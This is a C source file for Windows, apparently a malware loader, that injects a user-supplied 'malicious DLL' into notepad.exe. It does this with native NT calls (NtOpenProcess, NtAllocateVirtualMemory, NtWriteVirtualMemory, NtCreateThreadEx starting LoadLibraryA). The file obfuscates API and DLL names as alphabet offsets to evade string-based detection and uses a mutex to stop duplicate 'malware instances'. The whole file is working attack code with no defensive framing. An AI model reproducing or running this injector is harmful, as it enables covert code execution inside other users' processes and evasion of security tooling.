#include <windows.h>
#include "native.h"
#include <stdlib.h>
#include <tlhelp32.h>

/*
what this code should do?
	-its purpose is to find OR take a pid arg to inject the malicious DLL into
*/

NTSTATUS STATUS;

char *GetOriginal(int offsets[],char * ALL_ALPHANUM, int sizeof_offset){
    int size = sizeof_offset / 4;  // Calculate how many characters to retrieve
    char *empty_string = malloc((size + 1) * sizeof(char));  // Allocate memory for the string + null terminator

    if (empty_string == NULL) {
        //printf("Memory allocation failed\n");
        return NULL;
    }

    for (int i = 0; i < size; ++i) {
        char character = ALL_ALPHANUM[offsets[i]];
        empty_string[i] = character;  // Append the character to the string
		//printf("%c,",character);
	}

    empty_string[size] = '\0';  // Null-terminate the string

	return empty_string; 
}

void obfuscate(ALL_ALPHANUM,original)
	char * ALL_ALPHANUM;
	char * original;
{
	for (int i=0; i<strlen(original); i++){
		for (int j=0; j<strlen(ALL_ALPHANUM); j++){
			if (original[i] == ALL_ALPHANUM[j]){
				printf("%d,",j);
			}
		}
	}
	return;
}

HMODULE Get_Module(LPCWSTR Module_Name){
	HMODULE hModule;
	//printf("[+] Getting Handle to %lu\n", Module_Name);
	hModule = GetModuleHandleW(Module_Name);
	if (hModule == NULL) {
		//printf("[x] Failed to get handle to module, error: %lu\n", GetLastError());
		exit(1);
	}
	//printf("[+] Got Handle to module!\n");
	//printf("[%ls\t0x%p ]\n", Module_Name, hModule);
	return hModule;
}

HANDLE mutex_stuff(FARPROC mutex_create_func){
	//printf("[+] creating mutex\n");
	
	SECURITY_ATTRIBUTES sec_attr = {(DWORD) sizeof(SECURITY_ATTRIBUTES), NULL , TRUE};
	
	HANDLE my_mutex = mutex_create_func(&sec_attr,TRUE,"load_mutex");
	if (GetLastError() == ERROR_ALREADY_EXISTS) {
    // Malware instance already running
	//printf("[x] malware is already running \n");
    exit(1);  // Exit or perform cleanup
	}
	//printf("[+] mutex created successfully\n");
	return my_mutex;
}


CLIENT_ID enum_processes( 
						FARPROC create_snap_func,
						FARPROC proc_first_func,
						FARPROC proc_next_func
						)
{
	CLIENT_ID CID;
	PROCESSENTRY32 pe32;
	pe32.dwSize = sizeof(PROCESSENTRY32);
	HANDLE hProcess;
	
	//Take snapshot
	HANDLE snapshot = create_snap_func(TH32CS_SNAPPROCESS, 0);
	
	// Enumerate the snapshot
    proc_first_func(snapshot, &pe32);	
    
	// Loop through the whole snapshot until `target.exe` is found
    do {
        if (_stricmp(pe32.szExeFile, "notepad.exe") == 0) {
			CID.UniqueProcess = (HANDLE) pe32.th32ProcessID;
			CID.UniqueThread = NULL;
			
			break;
        }  
    } while (proc_next_func(snapshot, &pe32));
	return CID;
}


HANDLE get_proc_handle(	
						CLIENT_ID CID,
						ObjectAttributes Object_Attr,
						NtOpenProcess NT_OpenProcess
						)
{	
	HANDLE hProcess;
	//printf("[NtOpenProcess] Getting Process..\n");
	STATUS = NT_OpenProcess(&hProcess,PROCESS_ALL_ACCESS,&Object_Attr,&CID);
	if (STATUS != STATUS_SUCCESS) {
		//printf("[NtOpenProcess] Failed to get handle to process, error 0x%lx\n", STATUS);
		exit(1);
	}
	//printf("[NtOpenProcess] Got Handle to process! (%p)\n",hProcess);
	return hProcess;
}

BOOL allocate_mem(	HANDLE hProcess,
					PVOID *Buffer, 
					SIZE_T dll_size,
					NtAllocateVirtualMemory NT_VirtualAlloc)
{
	//printf("[NtAllocateVirtualMemory] Allocating [RW-] memory..\n");
	STATUS=NT_VirtualAlloc(hProcess,Buffer,0,&dll_size, MEM_COMMIT | MEM_RESERVE ,PAGE_READWRITE);
	if(STATUS != STATUS_SUCCESS){
		//printf("[NtAllocateVirtualMemory] Failed to allocate memeory , error 0x%lx\n",STATUS);
		return FALSE;
	}
	//printf("[NtAllocateVirtualMemory] Memory Allocated!\n");
	return TRUE;
}



BOOL write_mem(HANDLE hProcess,
				PCSTR dll_path,
				SIZE_T dll_size,
				SIZE_T *BytesWritten,
				PVOID *Buffer,
				NtWriteVirtualMemory NT_WriteVirtualMemory)
{
	//printf("[NtWriteVirtualMemory] Writing DLL into allocated memory..\n");
	STATUS=NT_WriteVirtualMemory(hProcess,*Buffer,dll_path,dll_size,&BytesWritten);
	if(STATUS != STATUS_SUCCESS){
		//printf("[NtWriteVirtualMemory] Failed to write into memeory , error 0x%lx\n",STATUS);
		//printf("[NtWriteVirtualMemory] BytesWritten -> %lu\t DLL size -> %lu\n",BytesWritten,dll_size);
		return FALSE;
	}
	//printf("[NtWriteVirtualMemory] DLL Written!, dll size -> %lu bytes\tactually written -> %lu bytes\n",dll_size,BytesWritten);	
	return TRUE;
}


BOOL d11_magik(
				HANDLE *hThread,
				ObjectAttributes *Object_Attr,
				HANDLE *hProcess,
				PVOID *Buffer,
				FARPROC L_0_D_LIB,
				NtCreateThreadEx NT_CreateThreadEx
				)
{
	// --- START LOAD LIBRARY IN REMOTE PROCESS --- //

	//printf("[NtCreateThreadEx] Injecting DLL to Remote Process\n");
	
	STATUS=NT_CreateThreadEx(hThread,THREAD_ALL_ACCESS,Object_Attr,*hProcess,(PUSER_THREAD_START_ROUTINE)L_0_D_LIB,*Buffer,FALSE,0,0,0,NULL);
	if(STATUS != STATUS_SUCCESS){
		//printf("[NtCreateThreadEx] Failed to inject DLL , error 0x%lx\n",STATUS);
		return FALSE;
	}
	//printf("[NtCreateThreadEx] DLL injected (0x%p)..\n",hThread);	
	
	// --- END LOAD LIBRARY IN REMOTE PROCESS --- //
	return TRUE;
}

int main(int argc , char **argv){
	
	// --- START GET malicious dll path --- //
	if (argc < 2){
		printf("[x] USAGE: ./%s [dll-path]\n",argv[0]);
		return EXIT_FAILURE;
	}
	// --- END GET malicious dll path --- //
	
	// --- START INIT VARS ---//
	
	
	PCSTR dll_path = argv[1];
	
	CLIENT_ID CID;
	HANDLE hThread;
	HANDLE hProcess;
	DWORD OldProtect_MEM = 0;
	DWORD OldProtect_THREAD = 0;
	SIZE_T BytesWritten = 0;
	PVOID Buffer = NULL;
	SIZE_T dll_size = strlen(dll_path) + 1;
	char ALL_ALPHANUM[]="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789._";

	HMODULE hNTDLL = Get_Module(L"NTDLL");
	HMODULE hK32 = Get_Module(L"Kernel32");
	// --- END INIT VARS ---//
	
	// --- START INIT STRUCTS ---//
	ObjectAttributes Object_Attr = { sizeof(Object_Attr),NULL };
	
	// --- END INIT STRUCTS --- //
	
	// --- START OFFSETS --- //
	int dll_k_er_32_offset[] = {10,4,17,13,4,11,55,54,62,3,11,11};
	int dll_n__t_offset[] = {39,45,29,37,37};
	
	int lib_load_offset[] = {37,14,0,3,37,8,1,17,0,17,24,26};
	
	int create_snap_offset[] = {28,17,4,0,19,4,45,14,14,11,7,4,11,15,55,54,44,13,0,15,18,7,14,19};
	int proc_first_offset[] = {41,17,14,2,4,18,18,55,54,31,8,17,18,19};
	int proc_next_offset[] = {41,17,14,2,4,18,18,55,54,39,4,23,19};
	
	int mutex_create_offset[] = {28,17,4,0,19,4,38,20,19,4,23,26};
	
	
	
	
	// --- END OFFSETS --- //
	FARPROC L_0_D_LIB = GetProcAddress(hK32,GetOriginal(lib_load_offset,ALL_ALPHANUM,sizeof(lib_load_offset)));

	// --- START LOAD KERNEL32 DLL --- //
	HMODULE hDLL_k_er_32 = L_0_D_LIB(GetOriginal(dll_k_er_32_offset,ALL_ALPHANUM,sizeof(dll_k_er_32_offset)));
	if (hDLL_k_er_32 == NULL){
		//printf("[x] COULD NOT LOAD kernel32.dll, err -> %lu\n",GetLastError());
		exit(1);
	}
	// --- END LOAD KERNEL32 DLL ---//
	
		// --- START LOAD NTDLL DLL --- //
	HMODULE hDLL_n__t = L_0_D_LIB(GetOriginal(dll_n__t_offset,ALL_ALPHANUM,sizeof(dll_n__t_offset)));
	if (hDLL_k_er_32 == NULL){
		//printf("[x] COULD NOT LOAD ntdll.dll, err -> %lu\n",GetLastError());
		exit(1);
	}
	// --- END LOAD NTDLL DLL ---//
	
	
	// --- START FUNCTION PROTOTYPES INIT --- //
	printf("[+] getting prototypes ready...\n");
	NtOpenProcess NT_OpenProcess = (NtOpenProcess)GetProcAddress(hDLL_n__t, "NtOpenProcess"); 
	NtCreateProcessEx NT_CreateProcessEx = (NtCreateProcessEx)GetProcAddress(hDLL_n__t,"NtCreateProcessEx");
	NtCreateThreadEx NT_CreateThreadEx = (NtCreateThreadEx)GetProcAddress(hDLL_n__t, "NtCreateThreadEx"); 
	NtClose NT_Close = (NtClose)GetProcAddress(hDLL_n__t, "NtClose");
	NtAllocateVirtualMemory NT_VirtualAlloc = (NtAllocateVirtualMemory)GetProcAddress(hDLL_n__t,"NtAllocateVirtualMemory");	
	NtWriteVirtualMemory NT_WriteVirtualMemory = (NtWriteVirtualMemory)GetProcAddress(hDLL_n__t,"NtWriteVirtualMemory");		
	NtProtectVirtualMemory NT_ProtectVirtualMemory = (NtProtectVirtualMemory)GetProcAddress(hDLL_n__t,"NtProtectVirtualMemory");	
	NtWaitForSingleObject NT_WaitForSingleObject = (NtWaitForSingleObject)GetProcAddress(hDLL_n__t,"NtWaitForSingleObject");
	NtFreeVirtualMemory NT_FreeVirtualMemory = (NtFreeVirtualMemory)GetProcAddress(hDLL_n__t,"NtFreeVirtualMemory");
	FARPROC create_snap_func = GetProcAddress(hDLL_k_er_32,GetOriginal(create_snap_offset,ALL_ALPHANUM,sizeof(create_snap_offset)));
	FARPROC proc_first_func = GetProcAddress(hDLL_k_er_32,GetOriginal(proc_first_offset,ALL_ALPHANUM,sizeof(proc_first_offset)));
	FARPROC proc_next_func = GetProcAddress(hDLL_k_er_32,GetOriginal(proc_next_offset,ALL_ALPHANUM,sizeof(proc_next_offset)));
	FARPROC mutex_create_func =  GetProcAddress(hDLL_k_er_32,GetOriginal(mutex_create_offset,ALL_ALPHANUM,sizeof(mutex_create_offset)));
	printf("[+] prototypes are ready...\n");
	// --- END FUNCTION PROTOTYPES INIT --- //
	

	
	HANDLE hMutex=mutex_stuff(mutex_create_func);
	
	
    CID = enum_processes(create_snap_func,proc_first_func,proc_next_func);
	hProcess = get_proc_handle(CID,Object_Attr,NT_OpenProcess);
	
    if ( !allocate_mem(hProcess,&Buffer,dll_size,NT_VirtualAlloc) ){
		goto CLEANUP;
	}
	
	
	if ( !write_mem(hProcess,dll_path,dll_size,&BytesWritten,&Buffer,NT_WriteVirtualMemory) ){	
		goto CLEANUP;
	}
	
	if (! d11_magik(&hThread, &Object_Attr,&hProcess,&Buffer,L_0_D_LIB,NT_CreateThreadEx) ){
		goto CLEANUP;
	}
	
	
	// --- START WAIT --- //
	printf("[0x%p] Waiting to Finish Execution\n",hThread);
	STATUS=NT_WaitForSingleObject(hThread,FALSE,NULL);
	//printf("[NtWaitForSingleObject] Thread (0x%p) Finished! Beginning Cleanup\n",hThread);
	// --- END WAIT --- //
	
	
	
	
CLEANUP:
	if (Buffer){
		STATUS=NT_FreeVirtualMemory(hProcess,&Buffer,&dll_size,MEM_DECOMMIT);
		if (STATUS_SUCCESS != STATUS) {
            printf("[NtClose] Failed to decommit allocated buffer, error 0x%lx\n", STATUS);
        }
		//printf("[NtClose] decommitted allocated buffer (0x%p) from process memory\n", Buffer);
	}
	if(hThread){
		//printf("[NtClose] Closing hThread handle\n");
		NT_Close(hThread);
	}
	if(hProcess){
		//printf("[NtClose] Closing hProcess handle\n");
		NT_Close(hProcess);
	}
	if(hMutex){
		//printf("[NtClose] Closing hMutex handle\n");
		NT_Close(hMutex);
	}
	
	return EXIT_SUCCESS;
}